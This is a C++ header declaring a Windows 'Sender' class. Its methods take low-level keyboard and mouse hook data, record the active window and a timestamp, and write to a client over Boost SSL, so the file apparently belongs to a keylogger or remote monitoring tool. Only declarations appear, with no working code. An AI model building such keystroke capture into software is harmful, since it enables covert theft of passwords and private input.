#pragma once

# define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <Windows.h>
#include "Client.h"
#include <boost\asio\ssl.hpp>
#include <boost/cstdint.hpp>
#include <boost/date_time/posix_time/posix_time.hpp>


class Sender {
public:
	Sender(Client *dest);
	~Sender();

	void	sendKey(int code, WPARAM wParam, LPARAM lParam);
	void	sendClick(int code, WPARAM wParam, LPARAM lParam);
	void	sendMouse(int code, WPARAM wParam, LPARAM lParam, MSLLHOOKSTRUCT* mouseStruct);
	
	void	write_to_client(std::string msg);

protected:
	Client	*_client;


	std::string *getActiveWindow();
	__int64	timeUnix();
};


